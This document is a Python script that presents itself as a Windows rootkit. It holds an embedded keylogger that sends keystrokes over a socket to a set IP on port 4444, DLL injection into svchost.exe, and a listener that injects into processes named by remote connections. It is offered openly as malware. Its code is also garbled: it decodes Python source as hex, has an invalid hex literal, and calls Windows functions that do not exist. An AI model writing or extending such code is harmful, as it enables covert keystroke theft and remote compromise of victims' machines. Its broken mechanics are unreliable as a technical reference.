# Windows Rootkit (Python) - Network Infection and Remote Access

import socket
import struct
import os
import msvcrt
import ctypes
import threading
import time
import pynput
from pynput.keyboard import Listener

# Global variables
IP = "192.168.1.1"  # Replace with target IP
PORT = 4444

# DLL Payload
dll_payload = """
import socket
import pynput
from pynput.keyboard import Listener

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{}", {}))

def on_press(key):
    data = key.char or key.scancode
    s.sendall(struct.pack("Q", data))

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

s.close()
""".format(IP, PORT)

# Create DLL file
dll_file = open("backdoor.dll", "wb")
dll_file.write(bytes.fromhex(dll_payload))
dll_file.close()

# Create and inject DLL into system process
def inject_dll(process_name):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    GetModuleHandleA = kernel32.GetModuleHandleA
    LoadLibraryA = kernel32.LoadLibraryA
    CreateFileA = kernel32.CreateFileA
    WriteFile = kernel32.WriteFile
    CloseHandle = kernel32.CloseHandle
    VirtualAllocEx = ntdll.VirtualAllocEx
    VirtualProtectEx = ntdll.VirtualProtectEx
    CreateRemoteThread = ntdll.CreateRemoteThread
    GetProcessIdByProcessNameA = kernel32.GetProcessIdByProcessNameA

    process_id = GetProcessIdByProcessNameA(process_name.encode("utf-8"))
    h_process = CreateFileA(ctypes.create_unicode_buffer(process_name), 0, 0, 0, 0x400h, 0x00000003, 0)
    if h_process == -1:
        print("Error: Could not open process.")
        return

    base_address = VirtualAllocEx(h_process, 0, len(dll_payload), 0x3000, 0x4000)
    if base_address == 0:
        print("Error: Could not allocate memory.")
        CloseHandle(h_process)
        return

    WriteFile(h_process, dll_payload, len(dll_payload), ctypes.c_ulong(0), ctypes.POINTER(ctypes.c_ulong()))

    old_protect = ctypes.c_ulong(0)
    VirtualProtectEx(h_process, base_address, len(dll_payload), 0x40, old_protect)

    thread_id = CreateRemoteThread(h_process, 0, 0, ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)(ctypes.windll.kernel32.LoadLibraryA), base_address, 0, 0)
    CloseHandle(h_process)

# Infect other computers on the network
def scan_network():
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((socket.gethostbyname(socket.gethostname()), PORT))
    s.listen(5)

    while True:
        conn, addr = s.accept()
        print("Connected by", addr)

        process_name = conn.recv(1024).decode()
        inject_dll(process_name)
        conn.close()

# Start the rootkit
def main():
    threading.Thread(target=scan_network).start()
    inject_dll("svchost.exe")

if __name__ == "__main__":
    main()